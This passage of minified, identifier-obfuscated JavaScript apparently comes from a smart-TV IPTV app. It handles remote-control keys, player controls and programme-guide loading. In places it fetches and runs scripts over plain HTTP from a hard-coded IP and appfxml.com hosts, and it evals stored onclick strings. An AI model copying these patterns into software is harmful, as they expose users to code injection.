key=VK_RED}else if(okey.match(/center/i))key=VK_ENTER;else if(okey.match(/(channeldown|previous)/i))key=VK_PAGE_DOWN;else if(okey.match(/(channelup|next)/i))key=VK_PAGE_UP;else if(okey.match(/pause/i))key=VK_PAUSE;else if(okey.match(/mediaplay/i))key=VK_PLAY;else if(okey.match(/stop/i))key=VK_STOP;else if(okey.match(/rewind/i))key=VK_REWIND;else if(okey.match(/forward/i))key=VK_FAST_FWD;else if(okey.match(/left/i))key=VK_LEFT;else if(okey.match(/up/i)&&!okey.match(/volume/i))key=VK_UP;else if(okey.match(/down/i)&&!okey.match(/volume/i))key=VK_DOWN;else if(okey.match(/right/i))key=VK_RIGHT;else if(okey.match(/(enter|inter)/i))key=VK_ENTER;else{var kk=key.split("/");k1=parseInt(kk[0]);k2=parseInt(kk[1]);if(isNaN(k1))k1=0;if(isNaN(k2))k2=0;if(k1>k2)key=k1;else if(k2>k1)key=k1;if(key==82)key=VK_RED}}catch(e){}}
if(isScreensaver){if(key==VK_UP&&maJor.uel&&maJor.uel.playlist_url){maJor.aevent=function(){maJor.hint("<img align=left style='padding:0px 2px;width:20px;height:20px;' src='"+_img("_ST_f_fav_off.png?ndate240209_")+"'> Нажмите для добавления этой страницы в закладки, чтобы ее посмотреть позже","kb5")};OpenUrl(maJor.parsers.link(maJor.uel.playlist_url));maJor.uel=null}else screensaver_mod(0);return}
screensavertimer=-1;if(key==8&&maJor.platform()!="maple")key=VK_BACK;if(booting){if(((key==VK_RED||key==VK_A))||(maJor.platform()=="maple"&&key==VK_TOOLS)){if(brs++)sbrosok(!0);return}}
if(!gV(event,"repeat")){if(key==rrK){rrK=null;return}else{rrK=key;setTimeout("rrK=null;",40)}}
if(maJor.platform()=="maple"){if(key==VK_BACK||key==VK_EXIT){if(kjtYpr.Exittrue<2){widgetAPI.blockNavigation(event)}}else if(key==tvKey.KEY_PANEL_VOL_UP||key==tvKey.KEY_VOL_UP){vPlayer.maple.volume(90);return}else if(key==tvKey.KEY_VOL_DOWN||key==tvKey.KEY_PANEL_VOL_DOWN){vPlayer.maple.volume(10);return}else if(key==tvKey.KEY_MUTE){vPlayer.isMuted=!vPlayer.isMuted;vPlayer.maple.pluginAudio.SetUserMute(vPlayer.isMuted?1:0);return}}else if(maJor.platform()!="android-device"&&event.stopPropagation){if(typeof event.stopPropagation==="function")event.stopPropagation();if(typeof event.preventDefault==="function")event.preventDefault();if(typeof event.stopImmediatePropagation==="function")event.stopImmediatePropagation()}
if(maJor.platform()=="mag"){if(key==KEY_VOLUME_PLUS){xVol+=5;if(xVol>100)xVol=100;stb.SetVolume(xVol);vPlayer.l1O0Ol1iOVI0O1Ypr("Громкость: "+xVol)}
if(key==KEY_VOLUME_MINUS){xVol-=5;if(xVol<0)xVol=0;stb.SetVolume(xVol);vPlayer.l1O0Ol1iOVI0O1Ypr("Громкость: "+xVol)}
if(key>30)kjtYpr.Exittrue=0}else if(key!=VK_EXIT)kjtYpr.Exittrue=0;if(maJor.platform()=="sony"){if(key==112)key=VK_BLUE;else if(key==113)key=VK_RED;else if(key==114)key=VK_GREEN;else if(key==115)key=VK_YELLOW;else if(key==457)key=VK_INFO}
maJor.hintremove();if(handler!="confirm"&&handler!="vk"&&tscreen=="game"&&(key==VK_BACK||key==VK_ENTER||key==VK_DOWN||key==VK_UP)){if(key==VK_BACK){if(!tomflight_f)tomflight_fail();else{tscreen="main";$_("game").style.display="none";$_("game").style.zIndex="0"}}
if(key==VK_UP){tomflight_click()}else if(key==VK_DOWN){tomflight_down()}else{tomflight_click()}
return}
if(handler=="confirm"&&$_("vk").style.display=="block")handler="vk";switch(parseInt(maJor.params.get("return"))){case 1:if(key==VK_RED||key==VK_A)key=VK_BACK;break;case 2:if(key==VK_GREEN)key=VK_BACK;break;case 3:if(key==VK_YELLOW)key=VK_BACK;break;case 4:if(key==VK_BLUE)key=VK_BACK;break;case 5:if(key==VK_LEFT){if(handler=="menu"&&select>=0&&!l0OII100kdNdQl01lYpr())key=VK_BACK}
break}
if(handler=="ext"){if(key==VK_RED||key==VK_A||key==VK_BACK){ext_close();return}
if($_("ext").style.display=="none"||typeof $_("frame-id")=="undefined")maJor.setHandler("menu");if(key==VK_BACK)$_("frame-id").contentWindow.postMessage({'cmd':'return','text':''},"*")}
if(key!=VK_ENTER)doubleEvent=0;switch(handler){case "confirm":switch(key){case VK_LEFT:confirmed.sel("--");break;case VK_RIGHT:confirmed.sel("++");break;case VK_ENTER:confirmed.click();break;case VK_BACK:confirmed.close();break;case VK_DOWN:break;case VK_UP:break;default:break}
break;case "description":switch(key){case VK_DOWN:case VK_RIGHT:$_("zpanel").scrollTop+=100;break;case VK_LEFT:case VK_UP:$_("zpanel").scrollTop-=100;break;case VK_BACK:case VK_ENTER:case VK_STOP:maJor.setHandler("menu");$_("zpanel").style.display="none";$_("zpanel","");$_("controlcontent").style.display="block";$_("description").style.display="block";$_("menu").style.display="block";break}
break;case "aside":var a=gP();if(!a)return;switch(key){case VK_DOWN:a.aside_sel("+");break;case VK_UP:a.aside_sel("-");break;case VK_ENTER:a.aside_click();break;case VK_RIGHT:case VK_BACK:a.aside_close();break;case VK_LEFT:a.aside_close();osetPos(-1,0,1);break}
break;case "move":switch(key){case VK_DOWN:kjtYpr.Edit(gP("lO10111O0001lOl00Ypr"),"down");handler="move";break;case VK_LEFT:kjtYpr.Edit(gP("lO10111O0001lOl00Ypr"),"left");handler="move";break;case VK_RIGHT:kjtYpr.Edit(gP("lO10111O0001lOl00Ypr"),"right");handler="move";break;case VK_UP:kjtYpr.Edit(gP("lO10111O0001lOl00Ypr"),"up");handler="move";break;case VK_BACK:case VK_ENTER:maJor.setHandler("menu");break}
break;case "context":var is_sub=ContextMenu.subMenu.length;switch(key){case VK_DOWN:ContextMenu.pos("+",is_sub);break;case VK_UP:ContextMenu.pos("-",is_sub);break;case VK_RIGHT:if(ContextMenu.hasRight())ContextMenu.enter();break;case VK_LEFT:if(is_sub)ContextMenu.closeSubMenu();break;case VK_ENTER:ContextMenu.enter();break;case VK_RED:case VK_A:case VK_BACK:case 8:case 220:if(is_sub)ContextMenu.closeSubMenu();else{ContextMenu.closeMenu();maJor.setHandler("menu")}
break}
break;case "vk":VK.handler(key);break;case "qual":switch(key){case VK_BACK:case 8:case 220:vPlayer.qualClose();break;case VK_LEFT:lIOIl11yHub1Ol1IYpr(-1);break;case VK_RIGHT:lIOIl11yHub1Ol1IYpr(1);break;case VK_UP:vPlayer.lIl0II1OOluuB0IO0OYpr--;l0IlIOf1vOIl101Ypr();break;case VK_DOWN:vPlayer.lIl0II1OOluuB0IO0OYpr++;l0IlIOf1vOIl101Ypr();break;case VK_ENTER:lIOIl11yHub1Ol1IYpr(0);break;case VK_BLUE:vPlayer.player().setSize(parseInt(maJor.params.get('xmode'))+1);vPlayer.showPlayer();break}
break;case "menu":if($_("ext")&&$_("ext").style.display=="block"){handler="ext";kjtYpr.popUp("<img width='55' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> "+"Запущен iframe<br>"+"Меню (красная кнопка) - Закрыть<br>"+"CH UP / CH DOWN - Открыть другую вкладку"+"",2000);return}
if(vPlayer.audio.vk_visual){if(key==VK_BACK||key==8||key==220||key==VK_RIGHT||key==VK_LEFT||key==VK_DOWN||key==VK_ENTER||key==VK_STOP){vPlayer.audio.visual();return}}
switch(key){case VK_0:setKey(0);break;case VK_1:setKey(1);break;case VK_2:setKey(2);break;case VK_3:setKey(3);break;case VK_4:setKey(4);break;case VK_5:setKey(5);break;case VK_6:setKey(6);break;case VK_7:setKey(7);break;case VK_8:setKey(8);break;case VK_9:setKey(9);break;case VK_EXIT:kjtYpr.Exittrue++;if(kjtYpr.Exittrue<2){kjtYpr.inf("_FPNazhmExitEsheRazDlyaVihoda_!",1300,"red")}else{if(maJor.params.get('ts')>0)autoexport();else closeapp()}
break;case VK_PAGE_UP:case 33:kth=0;if($_("scrolled")!=null)var nd="scrolled";else nd="description";if($_(nd).scrollTop<=0){$_(nd).scrollTop=0;if(getSelect()>=0){if(gP().menu.length)Il01QllQll().focused(0);Il01QllQll().focused(-1)}else buff.scrollsitetop(buff.scrollsitetop()-250)}else $_(nd).scrollTop-=25;break;case VK_PAGE_DOWN:case 34:if(getSelect()==-1){select=oldselect;Il01QllQll().focused();return}else{if($_("scrolled")!=null)var nd="scrolled";else nd="description";var th=$_(nd).scrollTop;$_(nd).scrollTop+=25;if(th==$_(nd).scrollTop){if(nd=="scrolled"&&kth<3){kth++;var div=document.createElement('div');div.id="blinkdiv";div.style.position="relative";div.style.height="0px";div.style.marginTop="-4px";div.style.display="block";div.style.width=$_(nd).style.width+"px";div.style.border="2px solid red";$_(nd).appendChild(div);setTimeout('$_("blinkdiv").parentNode.removeChild($_("blinkdiv"));',800)}else buff.scrollsitetop(buff.scrollsitetop()+250)}else kth=0}
break;case VK_BACK:case 8:case 220:if(menuSubSel>-2)return menu_hideSub();clearTimeout(backtimer);backtimer=setTimeout(function(){plmini_canplay=!0;Il01QllQll().back()},30);break;case VK_N:case VK_FAST_FWD:if(vPlayer.audio.played())vPlayer.audio.play(null,++vPlayer.audio.sel);break;case VK_REWIND:if(vPlayer.audio.played())vPlayer.audio.play(null,--vPlayer.audio.sel);break;case VK_BLUE:gotoStart();break;case VK_RED:case VK_A:if($_("ext").style.display=="block"){maJor.setHandler("menu");$_("ext","");$_("ext").style.display="none";return}
if(vPlayer.minimize)vPlayer.minimizeplayer(!1);else ContextMenu.show();break;case VK_GREEN:case VK_B:if(typeof curCh()["green"]=="object"){ol0I1OIuIyUII0lYpr(curCh()["green"])}else ol0I1OIuIyUII0lYpr("about:favorites");break;case VK_YELLOW:case VK_C:if(typeof curCh()["yellow"]=="object"){ol0I1OIuIyUII0lYpr(curCh()["yellow"])}else if(curCh()["yellow_url"]){var ch={};ch.title=curCh()["yellow_title"];ch.parser=curCh()["yellow_parser"];ch.playlist_url=curCh()["yellow_url"];ol0I1OIuIyUII0lYpr(ch)}else{ContextMenu.show('topmenu')}
break;case VK_Q:if(ttmac||document.location.href.indexOf("960_540")>0){if(curCh()["playlist_url"].indexOf("?list=")>0){var k=curCh()["playlist_url"].split("?list=")[1];$_("description").innerHTML=unescape(k)}else $_("description").innerHTML=curCh()["playlist_url"]+curCh("stream_url")}
break;case VK_RIGHT:osetPos(1,0);break;case VK_LEFT:osetPos(-1,0);break;case VK_UP:if($_("scrolltextarea")&&$_("scrolltextarea").scrollTop>0)$_("scrolltextarea").scrollTop-=200;else osetPos(0,-1);break;case VK_DOWN:if($_("scrolltextarea"))$_("scrolltextarea").scrollTop+=200;else osetPos(0,1);break;case VK_ENTER:if(doubleEvent){doubleEvent=0;ContextMenu.show()}else{doubleEvent=1;doubleTimer=setTimeout(function(){if(doubleEvent){doubleEvent=0;if(getSelect()==-4){eval(maJor.omniBut[oInset.omni_hor].onclick)}else if(getSelect()==-3)menu_play();else if(getSelect()==-2)sidebar_play();else if(getSelect()==-1)oInset.playInset();else Il01QllQll().play()}},300)}
break;case VK_BLUE:gotoStart();break;case VK_P:case VK_PLAY:if(vPlayer.audio.active){if(parseInt($_('vk_audio_pos').style.width)<2||vPlayer.stopped){vPlayer.audio.play();$_("vk_play_button").style.display="none"}else vPlayer.play()}else vPlayer.stream.playPip();break;case VK_PAUSE:if(vPlayer.audio.played())vPlayer.pause();break;case VK_STOP:case VK_S:if(vPlayer.audio.played()&&vPlayer.stopped){vPlayer.audio.close()}
if(vPlayer.minimize)vPlayer.minimizeplayer(!1);vPlayer.lll0Q10I0lI1O0Oll0OOYpr();is_loadpage(-1);break}
break;case "player":if($_("playerBottom").style.display=="none"&&(key==VK_LEFT||key==VK_RIGHT||key==VK_UP||key==VK_DOWN||key==VK_ENTER)){if(key==VK_ENTER&&(vPlayer.pos[1]==2||(vPlayer.pos[1]==1&&vPlayer.pos[0]<2))){}else{vPlayer.showPlayer(1);return}}
vPlayer.showPlayer(1);if(adsPage.state()==2){adsPage.key(key);return!1}
b="player"+key;switch(key){case VK_0:vPlayer.setPercent(0);break;case VK_1:vPlayer.setPercent(10);break;case VK_2:vPlayer.setPercent(20);break;case VK_3:vPlayer.setPercent(30);break;case VK_4:vPlayer.setPercent(40);break;case VK_5:vPlayer.setPercent(50);break;case VK_6:vPlayer.setPercent(60);break;case VK_7:vPlayer.setPercent(70);break;case VK_8:vPlayer.setPercent(80);break;case VK_9:vPlayer.setPercent(90);break;case VK_FAST_FWD:vPlayer.frw(1);break;case VK_REWIND:vPlayer.frw(-1);break;case 259:case 10190:vPlayer.flastView();break;case VK_L:case VK_INFO:if($_("loading").style.display=="block")$_("loading").style.display="none";info_mode=(info_mode+1)%5;if(info_mode==2)info_mode++;maJor.popUp("INFO: "+info_mode,400);vPlayer.hidePlayer();if(info_mode)return;break;case 32:case 10252:if(vPlayer.paused){if(vPlayer.l0QOOILTvlIO0O1Ypr)vPlayer.l1l0O00UvlOlOO111Ypr();else vPlayer.play()}else vPlayer.pause();break;case VK_PAUSE:vPlayer.pause();break;case VK_PLAY:if(vPlayer.l0QOOILTvlIO0O1Ypr){vPlayer.l1l0O00UvlOlOO111Ypr()}else vPlayer.play();break;case VK_STOP:case VK_EXIT:case VK_BACK:vPlayer.lll0Q10I0lI1O0Oll0OOYpr();break;case VK_Y:case VK_YELLOW:if(gP("is_iptv")>2){vPlayer.minimizeplayer(!0);set_epg()}else if(vPlayer.player().quality)lIOIl11yHub1Ol1IYpr(1,"quality");break;case VK_A:case VK_RED:vPlayer.minimizeplayer(!0);break;case VK_BLUE:vPlayer.player().setSize(parseInt(maJor.params.get('xmode'))+1);vPlayer.showPlayer();break;case VK_GREEN:if(vPlayer.player().audioTracks)lIOIl11yHub1Ol1IYpr(1,"audio");else if(l0lIl1lTqx011IYpr=="media"&&maJor.platform().match(/lg/))lIOIl11yHub1Ol1IYpr(1,"lgzvdor");break;case VK_RIGHT:if(vPlayer.playUrl=="description"){plDesc-=720;if(plDesc>0)plDesc=0;$_("jw").style.marginTop=plDesc+"px";return}
vPlayer.setFocus(1);break;case VK_LEFT:if(vPlayer.playUrl=="description"){plDesc+=720;if(plDesc>0)plDesc=0;$_("jw").style.marginTop=plDesc+"px";return}
vPlayer.setFocus(-1);break;case VK_UP:if(vPlayer.playUrl=="description"){plDesc+=15;if(plDesc>0)plDesc=0;$_("jw").style.marginTop=plDesc+"px";return}
vPlayer.setFocus(0,1);break;case VK_DOWN:if(vPlayer.playUrl=="description"){plDesc-=15;$_("jw").style.marginTop=plDesc+"px";return}
vPlayer.setFocus(0,-1);break;case VK_ENTER:if($_("playerBottom").style.display=="block")vPlayer.selectedButton();break;case VK_PAGE_UP:vPlayer.lll110IjuIxI11IIYprNext(1);break;case VK_PAGE_DOWN:vPlayer.lll110IjuIxI11IIYprNext(-1);break;case VK_MUTE:plVolume(0,!0)
break;case KEY_VOLUME_PLUS:plVolume(10);break;case KEY_VOLUME_MINUS:plVolume(-10);break}
break}
event.returnValue=!1;return!1}
function trpt(){if(vPlayer.l0QOOILTvlIO0O1Ypr)vPlayer.l1l0O00UvlOlOO111Ypr()}
function getJserv(){return"exec.remotecurl.appfxml.com/curl"}
function objjoin(o,m){var r="";maJor.each(o,function(v,i){if(r!="")r+=m;r+=i});return r}
var errepg=0;function dt(sec,b,b2,b3,offc){sec=parseInt(sec);if(offc==null)sec+=((parseInt(maJor.params.get("JTVRegion"))||0)+(T.timezoneoffset/60))*3600;else sec+=offc*3600;var date=new Date(sec*1000);var hours=date.getHours();var minutes=date.getMinutes();var s=b?("0"+date.getDate()).slice(-2)+'.'+("0"+(date.getMonth()+1)).slice(-2):"";if(b3)s+='.'+date.getFullYear();var ss2=b2?':'+("0"+(sec%60)).slice(-2):"";return s+" "+("0"+hours).slice(-2)+':'+("0"+minutes).slice(-2)+ss2}
function pushNoEmpty(a,v){if(gV(v)!=="")a.push(v);return a}
var decodeEntities=(function(){var element=document.createElement('div');function decodeHTMLEntities(str){if(str&&typeof str==='string'){str=str.replace(/<script[^>]*>([\S\s]*?)<\/script>/gmi,'');str=str.replace(/<\/?\w(?:[^"'>]|"[^"]*"|'[^']*')*>/gmi,'');element.innerHTML=str;str=element.textContent;element.textContent=''}
return str}
return decodeHTMLEntities})();var fEpg={epg_ch:{},insetid:-1,epg_ch_full:{},epg_arr:{},l0O1llI11slaPkOIlI0Ypr:function(ch){if(typeof JtvC=="undefined"){clearTimeout(fEpg.etst);fEpg.etst=setTimeout(function(){errepg++;if(errepg<7){lI0Il1OrlwllI1Ypr("http://"+getJserv()+"/jtv.js?vv=6");lI0Il1OrlwllI1Ypr("http://46.36.220.208/common/jtv.js?vv=6")}},1900);return""}
var tvgid=ch.jtvname||ch["tvg-id"];if(tvgid){if(JtvE[tvgid])return tvgid;for(j in JtvEF){if(JtvEF[j][tvgid])return tvgid}}
var t2=String(decodeEntities(ch.title));var t3=trim2(t2.toLowerCase());var t4=t3.replace(/ ?(hd|sd|\(.*?\))/g,"");var t5=t3.replace(/ (ru|ua|en|fr|tv)/g,"");var t6=gVs(ch,"title").replace(/&/g,"&amp;");var xm=(JtvE[ch.title]&&ch.title)||(JtvE[t2]&&t2)||JtvC[ch.title]||JtvC[t6]||JtvC[t2]||JtvC[t3]||JtvC[t4]||JtvC[t5]||"";return xm},jtvXML:function(ch,md){var c=this,r="";if(typeof JtvCFxmltv=="undefined"||typeof JtvEFxmltv=="undefined"){c.loadxmltv()}else if(md){var tvgid=ch.jtvname||ch["tvg-id"];if(tvgid&&gV(JtvEFxmltv[md],tvgid))r="xmltv-"+md+"-"+tvgid;else if(ch.title&&gV(JtvCFxmltv[md],ch.title))r="xmltv-"+md+"-"+JtvCFxmltv[md][ch.title];else if(ch.title&&gV(JtvCFxmltv[md],gVs(ch,"title").replace(/&/g,"&amp;")))r="xmltv-"+md+"-"+JtvCFxmltv[md][gVs(ch,"title").replace(/&/g,"&amp;")]}
return r},etst:null,stop:function(){var c=this;clearTimeout(c.etst)},add:function(page,t){var c=this;try{c.insetid=page.l10I0O1I1lRl0QlI1OYpr.id+page.lO10111O0001lOl00Ypr.split("#")[0];if(t){c.etst=setTimeout(function(){c.add(page)},t)}
var xs={},xs2={};if(gV(page.global,"url_tvg"))var tvgmd=md5(page.global.url_tvg).substr(0,7);else tvgmd="";var ch=page.channels;maJor.each(ch,function(v,i){var cc=[];ch[i].logo_30x30=gV(v,"logo_30x30");if(!v.stream_url)return;cc=pushNoEmpty(cc,c.l0O1llI11slaPkOIlI0Ypr(v));if(tvgmd)cc=pushNoEmpty(cc,c.jtvXML(v,tvgmd));cc=pushNoEmpty(cc,gV(c.epg_arr[page.lO10111O0001lOl00Ypr],v.title));if(cc.length){maJor.each(cc,function(val){val=String(val);carr=val;if(val.indexOf("xmltv-")==0)xs2[val]=1;else xs[val]=1;if(v.logo_30x30.indexOf("http")!=0){if(val.indexOf("xmltv-")==0){var xf=val.split("-");var chmd5=xf[1];var chid=xf.splice(2).join("-");ch[i].logo_30x30=(window.JtvIMxmltv&&gV(JtvIMxmltv[chmd5],chid))}else ch[i].logo_30x30="http://"+getJserv()+"/img/"+val+".png"}});ch[i].epg=cc.join(",")}
if(!v.logo_30x30)ch[i].logo_30x30=_img("_ST_1px.png");if(!v.yellow&&(v.catchup||v.catchup_days||gV(page.global,"catchup")||gV(page.global,"catchup_days"))){if(gV(v,"catchup_days")==="")ch[i].catchup_days=gV(page.global,"catchup_days")||3;ch[i].catchup_source=v.catchup_source||gV(page.global,"catchup_source");ch[i].catchup=v.catchup||gV(page.global,"catchup")||"default";if(v.catchup_days){var ac={"title":"_FPArchive_","playlist_url":gV(v,"stream_url")+"#archive"};ac.SetTimeInterval=ch.SetTimeInterval;page.channels[i].yellow=ac;if(v.menu)page.channels[i].menu.push(ac);else page.channels[i].menu=[ac]}}});var x=objjoin(xs,"-|-");var x2=objjoin(xs2,"-|-");if(x||x2){c.epg_last=0;if(x!="")c.epg_src="http://"+getJserv()+"/sip.php?do=apt&ver=2&type=xhr#POSTget="+x;else c.epg_src="";if(x2!="")c.epg_src2="http://exec4.remotecurl.appfxml.com/curl/epg.php?ver=2&do=xmltv&type=xhr&cmd=epg&src="+encodeURIComponent(l1OOl0I0IASY10lQ10Ypr(JtvSRC))+"#POSTget="+x2;else c.epg_src2="";if(c.epg_ch){c.epg_time=T.timestamp;c.jsc()}
c.load()}
if(!Il01QllQll().isLoading)page.renderChannels(getSelect(),"update")}catch(e){jsshowErr("Error epg add: "+e.message)}},epgInDesc:function(){if(vPlayer.playElement&&vPlayer.playElement.epgnow)return 1},inPlayer:function(t){var c=this;var e=vPlayer.playElement&&(vPlayer.playElement.epgcode||vPlayer.playElement.epg);if(adsPage.state()!=2&&gP("is_iptv")>2&&e&&handler.match(/player|qual/)){var html="",epgTitle="";if(e)var se=c.epg_ch_full[e]||c.epg_ch[e];if(se){var epG=c.parse({epg:se,tvgshift:vPlayer.playElement["tvg-shift"],timestamp:t,from:c.epg_time,limit:2,player:1});html=gV(epG,"epgDesc");if(epG.epgTitle)epgTitle=epG.epgTitle}
$_("epg_full",(html||"_FPNo information_"));$_("epgTitle",(epgTitle||""));if(!html){if(c.epg_ch_full[e])delete c.epg_ch_full[e];c.getfull(vPlayer.playElement)}
return 1}},set_epg:function(n){var c=this;var ch=curCh();var data={"epg":1,"title":ch.title+"EPG","channels":[]};if(!n){c.epg_tl=ch.title;c.epg_tx=gP("lO10111O0001lOl00Ypr");data["chan"+"nels"]=[{"logo_30x30":"none","title":"_FPSteret_","playlist_url":"cmd:setEpg|-"+c.epg_tl+"|-"+c.epg_tx+"|-"}];data["chan"+"nels"].push({"logo_30x30":"none","playlist_url":"cmd:setEpgRegionmain","title":"iptvx.one"});for(j in JtvEF){data["chan"+"nels"].push({"logo_30x30":"none","playlist_url":"cmd:setEpgRegion"+j,"title":j.toUpperCase()})}}else if(n.indexOf("setEpgRegion")==0){var e=n.substr(12);if(e=="main")JtvArr=JtvE;else JtvArr=JtvEF[e];for(var i in JtvArr){data.channels.push({"logo_30x30":"http://"+getJserv()+"/img/"+i+".png","description":"EPG CODE: "+i,"jtvname":i,"title":(i.indexOf(".")>0)?JtvArr[i]+"."+i.split(".")[1]:JtvArr[i],"stream_url":"cmd:setEpg|-"+c.epg_tl+"|-"+c.epg_tx+"|-"+i+"|-"+n})}}else{var z=n.split("|-");if(!z[3])try{delete c.epg_arr[z[2]][z[1]]}catch(e){}else{if(!c.epg_arr[z[2]])c.epg_arr[z[2]]={};c.epg_arr[z[2]][z[1]]=z[3]}
maJor.write("epg_set",l1OOl0I0IASY10lQ10Ypr(c.epg_arr));setTimeout('kjtYpr.inf("'+z[1]+' уст. епг '+z[3]+'",1500);tmf();',150);return}
maJor.setHandler("menu");OpenUrl(data,gP("lO10111O0001lOl00Ypr").replace(/#.*$/,"")+"#"+(n||"setEpg"))},getfull:function(ch){var c=this;ch=ch||curCh();var tvgshift=(ch["tvg-shift"]||0)*3600;clearTimeout(c.prog_timer);var e=ch.epgcode||ch.epg;if(!e)return;else e=gVs(e).split(",")[0];var cu=gP("lO10111O0001lOl00Ypr");c.prog_timer=setTimeout(function(){if(c.insetid!=(insetActive+gPL("lO10111O0001lOl00Ypr").split("#")[0]))return;if(handler.match(/menu|player|qual/)&&e&&c.epg_ch[e]&&!c.epg_ch_full[e]){if(e.indexOf("xmltv-")==0)var u="http://exec4.remotecurl.appfxml.com/curl/epg.php?ver=2&do=xmltv&cmd=epg&src="+encodeURIComponent(l1OOl0I0IASY10lQ10Ypr(JtvSRC))+"&mode=full&get="+e;else u="http://"+getJserv()+"/sip.php?ver=2&do=full&get="+e;ch.description+="<center><img id='bloading' src='"+_img("_ST_b_loading.gif")+"' width=15 /></center>";if(handler!="vk"&&handler!="description"&&ch.index==getSelect())$_("description",ch.description);uHelper.create("directnoheader").setMaxTime(45).hid().get(u).parse=function(s){if($_("bloading"))$_("bloading").style.display="none";var m=lIlI1VBOOlI01QYpr(s);if(m&&m[e]){c.epg_ch[e]=m[e];c.epg_ch_full[e]=m[e];var epG=fEpg.parse({epg:m[e],tvgshift:tvgshift,from:(T.timestamp-600)});ch.description=c.setDesc(ch.title,epG.description);if(handler!="vk"&&handler!="description"&&ch.index==getSelect()&&cu==gP("lO10111O0001lOl00Ypr"))$_("description",ch.description)}}}},5000)},setDesc:function(title,desc){desc=desc||"_FPNo information_";return"<div style='width:98%;font-size:60%;text-align:right;vertical-align:top;'>"+title+"</div><div style='line-height:23px;'>"+desc+"</div>"},toArchive:function(obj){var c=this;var ch=[],tvgshift=(obj.params[5]||0)*3600,catchup=obj.params[3]||"";var catchup_source=obj.params[4]||"",catchup_days=obj.params[2]||0,logo=obj.logo||"none";if(obj.epg){maJor.each(obj.epg,function(v,start){start=parseInt(start)+tvgshift;var end=parseInt(v.end)+tvgshift;if(start<c.epg_time)ch.unshift({logo_30x30:logo,"title":"<span style=''>"+dt(start,!0)+" - "+dt(end)+"</span> "+v.title,"stream_url":vPlayer.arcurl(obj.url,start,catchup,catchup_source),"source_url":obj.url,"catchup":catchup,"catchup_source":catchup_source,"catchup_days":(-1*catchup_days),"arcCurTime":start})})}
var def15=T.timestamp-900;ch.unshift({logo_30x30:"none","title":"15 минут назад","stream_url":vPlayer.arcurl(obj.url,def15,catchup,catchup_source),"source_url":obj.url,"catchup":catchup,"catchup_source":catchup_source,"catchup_days":(-1*catchup_days),"arcCurTime":def15});return ch},secToHM:function(seconds){var hours=Math.floor(seconds/3600);var remainingSeconds=seconds%3600;var minutes=Math.floor(remainingSeconds/60);return(hours<10?'0':'')+hours+':'+(minutes<10?'0':'')+minutes},parse:function(obj){var c=this;if(obj.player){}
var res={"description":""},tvgshift=(obj.tvgshift||0)*3600,nl=obj.limit||-1;var pndate=T.date;if(obj.player&&vPlayer.playElement)vPlayer.playElement.epgnow=null;var ctime=obj.timestamp||c.epg_time;maJor.each(obj.epg,function(v,start){start=parseInt(start)+tvgshift;var dt_start=dt(start);var ttd=dt(start,1).split(" ")[0];var pedate=ttd.split(".")[0];var end=parseInt(v.end)+tvgshift;if(obj.from&&end<obj.from)return;var detail="<br>";if(pedate!=pndate&&!obj.player){if(res.description)res.description+="<div style='text-align: center;font-size: 20px;font-weight: bold;'>"+ttd+"</div>";pndate=pedate}
if(end>ctime&&start<=ctime){var t=Math.ceil((end-ctime)/60);if(t>=0)t="+"+t;res.curTime=ctime-start;res.totalTime=end-start;res.epgnow={"title":v.title,"curTime":res.curTime,"totalTime":res.totalTime,"time":t,"cur":Math.ceil((res.curTime/res.totalTime)*100)};if(obj.player&&vPlayer.playElement)vPlayer.playElement.epgnow=res.epgnow;if(v.detail){res.epgnow.detail=v.detail;detail="<div style='font-size:20px;color:#dddddd;'>"+v.detail+"</div>"}else detail="";if(obj.player){res.epgTitle=dt(start)+" <span>"+v.title+"</span>";res.epgDesc="<div style='max-height:40px;line-height:20px;overflow:hidden;text-overflow: ellipsis;'> "+detail+"</div>";res.description+=""+dt(start)+" <span style='color:#ffd600;'>"+v.title+"</span><br>"+"<div style='max-height:40px;line-height:20px;overflow:hidden;text-overflow: ellipsis;padding-left: 10px;'> "+detail+"</div>"}else res.description+="<div style='color:#ffd600;font-weight:bold;line-height:1;'>"+v.title+"</div><div style='font-size:20px;font-weight:bold;'>"+dt_start+" - "+dt(end)+" ("+c.secToHM(res.curTime)+"/"+c.secToHM(res.totalTime)+")</div> "+detail}else{if(obj.player){res.epgDesc+="<span style='color:rgb(197, 157, 157);'>_FPNext_:</span> <span style=''>"+dt_start+"</span> "+v.title+detail}else res.description+="<span style='font-size: 22px;'><b style='padding-right:5px;'>"+dt_start+"</b> "+v.title+"</span>"+detail}
if(nl>=0){if(--nl==0)return!1}});return res},load:function(){var c=this;if(c.insetid!=(insetActive+gPL("lO10111O0001lOl00Ypr").split("#")[0])){return}
if(T.inetTime-c.epg_last<60000&&T.inetTime>0){return}
c.epg_last=T.inetTime;clearTimeout(c.epg_timer);c.load_src(c.epg_src);c.load_src(c.epg_src2)},load_src:function(u){var c=this;if(u){uHelper.create("directnoheader").setMaxTime(45).hid().get(u).parse=function(s){if(s==null){maJor.statusbar("Error get EPG "+u,"text")}else{var x=lIlI1VBOOlI01QYpr(s);if(x)c.jsc(x);else maJor.statusbar("Error format EPG "+s.substr(0,30),"text")}}}},jsc:function(obj,timer){var c=this;if(c.insetid!=(insetActive+gPL("lO10111O0001lOl00Ypr").split("#")[0])){return}
if(obj)for(var j in obj)c.epg_ch[j]=obj[j];if(!c.epg_ch)return;if(!timer){clearTimeout(c.epg_timer);var nextM=Math.ceil(60-(T.timestamp%60))+1;c.epg_timer=setTimeout(function(){c.epg_ch.now=parseInt(c.epg_ch.now)+nextM;c.jsc()},nextM*1000)}
page=IlIll11I()||gP();c.epg_time=c.epg_ch.now;for(var i=0;i<page.channels.length;i++){var e1=gV(page.channels[i],"epg").split(",");maJor.each(e1,function(e){if(e&&c.epg_ch[e]){if(c.epg_ch_full[e])c.epg_ch[e]=c.epg_ch_full[e];var epG=fEpg.parse({epg:c.epg_ch[e],from:(T.timestamp-100),tvgshift:page.channels[i]["tvg-shift"]});page.channels[i].description=c.setDesc(page.channels[i].title,epG.description);page.channels[i].epgnow=epG.epgnow;page.channels[i].epgcode=e}})}
